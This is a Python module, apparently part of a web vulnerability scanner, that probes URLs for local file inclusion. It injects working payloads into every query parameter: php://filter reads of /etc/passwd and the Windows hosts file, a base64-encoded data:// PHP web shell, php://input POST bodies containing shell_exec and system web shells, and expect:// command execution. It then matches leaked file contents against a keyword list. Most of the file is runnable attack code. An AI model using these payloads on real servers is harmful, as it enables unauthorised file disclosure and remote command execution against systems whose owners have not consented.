import requests
from urllib.parse import urlparse
from termcolor import colored
from attacks.headers_creation import prepareHeaders


local_file_inclusion_list=[]



def payload_urlgenerator(url,payload):
    lfi_url_parsed=urlparse(url)
    target=lfi_url_parsed.scheme+'://'+lfi_url_parsed.netloc+lfi_url_parsed.path+'?'
    for query in lfi_url_parsed.query.split('&'):
        query_list=query.split('=')
        target+=query_list[0]+'='+payload+'&'
    target=target.rstrip('&')+lfi_url_parsed.fragment
    return target

def test_wordlist(url,wordlist,headers):
    #print(colored("TESTING  PATH TRUNCATING USING " + wordlist + " wordlist ...",'blue',attrs=['bold']))
    file_pointer_lfi = open(wordlist, "r")
    for line in file_pointer_lfi:
        line = line[:-1]
        u = payload_urlgenerator(url, line)
        try:
            res = requests.get(u, headers = headers) 
        except:
            continue
        if(checkPayload(res)):
            print(colored("\n[+] LOCAL FILE INCLUSION VULNERABILITY FOUND LINK        -->  " + u+'\n','red',attrs=['bold']))
            local_file_inclusion_list.append(u)
            file_pointer_lfi.close()
            return True
    return False

def test_php_filter(url,headers):
    testL = ["php://filter/resource=/etc/passwd","php://filter/convert.base64-encode/resource=/etc/passwd", "php://filter/convert.iconv.utf-8.utf-16/resource=/etc/passwd","php://filter/read=string.rot13/resource=/etc/passwd"]
    testW = ["php://filter/resource=C:/Windows/System32/drivers/etc/hosts","php://filter/convert.base64-encode/resource=C:/Windows/System32/drivers/etc/hosts","php://filter/convert.iconv.utf-8.utf-16/resource=C:/Windows/System32/drivers/etc/hosts","php://filter/read=string.rot13/resource=C:/Windows/System32/drivers/etc/hosts" ]
    #Linux
    for i in range(len(testL)):
        u =payload_urlgenerator(url,testL[i])
        try:
            res = requests.get(u, headers = headers)
        except:
            continue
        if(checkPayload(res)):
            print(colored("\n[+] LOCAL FILE INCLUSION VULNERABILITY FOUND LINK        -->  " + u+'\n','red',attrs=['bold']))
            local_file_inclusion_list.append(u)
            return True
    #Windows
    for i in range(len(testW)):
        u = payload_urlgenerator(url, testW[i])
        try:
            res = requests.get(u, headers = headers)
        except:
            continue
        if(checkPayload(res)):
            print(colored("[+] LOCAL FILE INCLUSION VULNERABILITY FOUND LINK        -->  " + u+'\n','red',attrs=['bold']))
            local_file_inclusion_list.append(u)
            return True
    return False

def test_php_data(url,headers):
    testL = ["data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=cat%20/etc/passwd"]
    testW = ["data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUW2NdKTsgPz4K&c=ipconfig"]
    #Linux
    for i in range(len(testL)):
        u = payload_urlgenerator(url, testL[i])
        try:
            res = requests.get(u, headers = headers)
        except:
            continue
        if(checkPayload(res)):
            print(colored("\n[+] LOCAL FILE INCLUSION VULNERABILITY FOUND LINK (RCE)  -->  " + u+'\n','red',attrs=['bold']))
            local_file_inclusion_list.append(u)
            return True
    #Windows
    for i in range(len(testW)):
        u = payload_urlgenerator(url, testW[i])
        try:
            res = requests.get(u, headers = headers)
        except:
            continue
        if(checkPayload(res)):
            print(colored("\n[+] LOCAL FILE INCLUSION VULNERABILITY FOUND LINK (RCE)  -->  " + u+'\n','red',attrs=['bold']))
            local_file_inclusion_list.append(u)
            return True
    return False
    

def test_php_input(url,headers):
    testL = ["php://input&cmd=cat%20/etc/passwd"]
    testW = ["php://input&cmd=ipconfig"]
    posts = ["<?php echo shell_exec($_GET['cmd']) ?>","<? system('cat /etc/passwd');echo exec($_GET['cmd']);?>"]
    #Linux
    for i in range(len(testL)):
        u =payload_urlgenerator(url, testL[i])
        for j in range(len(posts)):
            try:
                res = requests.post(u, headers = headers, data=posts[j])
            except:
                continue
            if(checkPayload(res)):
                print(colored("\n[+] LOCAL FILE INCLUSION VULNERABILITY FOUND LINK (RCE)  -->  " + u+ " -> HTTP POST: " + posts[j]+'\n','red',attrs=['bold']))
                local_file_inclusion_list.append(u)
                return True
        #Windows
        for k in range(len(testW)):
            u = payload_urlgenerator(url, testW[k])
            for l in range(len(posts)):
                try:
                    res = requests.post(u, headers = headers, data = posts[l])
                except:
                    continue
                if(checkPayload(res)):
                    print(colored("\n[+] LOCAL FILE INCLUSION VULNERABILITY FOUND LINK (RCE)  -->  " + u+ " -> HTTP POST: " + posts[l]+'\n','red',attrs=['bold']))
                    local_file_inclusion_list.append(u)
                    return True
    return False

def test_php_expect(url,headers):
    testL = ["expect://cat%20%2Fetc%2Fpasswd"]
    testW = ["expect://ipconfig"]
    #Linux
    for i in range(len(testL)):
        u = payload_urlgenerator(url, testL[i])
        try:
            res = requests.get(u, headers = headers)
        except:
            continue
        if(checkPayload(res)):
            print(colored("\n[+] LOCAL FILE INCLUSION VULNERABILITY FOUND LINK (RCE)  -->  " + u+'\n','red',attrs=['bold']))
            local_file_inclusion_list.append(u)
            return True
    #Windows
    for j in range(len(testW)):
        u = payload_urlgenerator(url, testW[j])
        try:
            res = requests.get(u, headers = headers)
        except:
            continue
        if(checkPayload(res)):
            print(colored("\n[+] LOCAL FILE INCLUSION VULNERABILITY FOUND LINK (RCE)  -->  " + u+'\n','red',attrs=['bold']))
            local_file_inclusion_list.append(u)
            return True
    return False
#1
def checkPayload(webResponse):
    KEY_WORDS = ["root:x:0:0", "www-data:",  "cm9vdDp4OjA6MD", "Ond3dy1kYXRhO", "ebbg:k:0:0", "jjj-qngn:k", "daemon:x:1:", "r o o t : x : 0 : 0","; for 16-bit app support", "sample HOSTS file used by Microsoft","Windows IP Configuration", "OyBmb3IgMT", "; sbe 16-ovg ncc fhccbeg", ";  f o r  1 6 - b i t  a p p", "fnzcyr UBFGF svyr hfrq ol Zvpebfbsg", "c2FtcGxlIEhPU1RT", "=1943785348b45","window.google=", "961bb08a95dbc34397248d92352da799"]
    for i in range(len(KEY_WORDS)):
        if KEY_WORDS[i] in webResponse.text:
            return True
    return False





def main(url,headers):
    try: 
        print(colored('[!] TRYING FILE INCLUSION VULNERABILITY       LINK       -->  '+url,'white',attrs=['dark']),flush=False,end='\n')
        success=False
        success=test_php_filter(url,headers)
        if(success==False):
            success=test_php_input(url,headers)
        if(success==False):
            success=test_php_data(url,headers)
        if(success==False):
            success=test_php_expect(url,headers)
        if(success==False):
            success=test_wordlist(url,"payloads/local_file_inclusion.txt",headers)
    except KeyboardInterrupt:
        print()
        print(colored('[-] KEYBOARD INTERRUPT CTRL+ C PRESSED DURING OPEN REDIRECTION CHECKING ','red',attrs=['bold']))
        return 'quit'
    except Exception as e:
        print(colored('[-] Exception --> '+str(e),'red'))
